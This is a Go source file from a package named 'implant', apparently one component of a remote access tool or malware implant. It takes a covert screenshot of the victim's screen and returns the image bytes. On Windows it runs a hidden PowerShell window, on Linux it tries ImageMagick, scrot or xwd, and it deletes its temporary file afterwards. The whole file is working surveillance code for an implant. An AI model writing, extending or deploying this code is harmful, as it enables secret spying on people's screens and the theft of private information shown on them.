package implant

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

// CaptureScreenshot takes a screenshot and returns the image bytes.
func CaptureScreenshot() ([]byte, error) {
	tmpDir := os.TempDir()
	outPath := filepath.Join(tmpDir, "ss.png")
	defer os.Remove(outPath)

	var err error
	if runtime.GOOS == "windows" {
		err = screenshotWindows(outPath)
	} else {
		err = screenshotLinux(outPath)
	}

	if err != nil {
		return nil, err
	}

	return os.ReadFile(outPath)
}

// screenshotWindows uses PowerShell to capture the screen.
func screenshotWindows(outPath string) error {
	psScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save('%s')
$graphics.Dispose()
$bitmap.Dispose()
`, outPath)

	_, err := ExecuteShell([]string{"powershell", "-WindowStyle", "Hidden", "-Command", psScript})
	return err
}

// screenshotLinux uses import (ImageMagick) or scrot as fallback.
func screenshotLinux(outPath string) error {
	// Try import (ImageMagick)
	_, err := ExecuteShell([]string{"import", "-window", "root", outPath})
	if err == nil {
		return nil
	}

	// Try scrot
	_, err = ExecuteShell([]string{"scrot", outPath})
	if err == nil {
		return nil
	}

	// Try xwd + convert
	_, err = ExecuteShell([]string{fmt.Sprintf("xwd -root -silent | convert xwd:- %s", outPath)})
	if err == nil {
		return nil
	}

	return fmt.Errorf("no screenshot tool available (tried: import, scrot, xwd)")
}
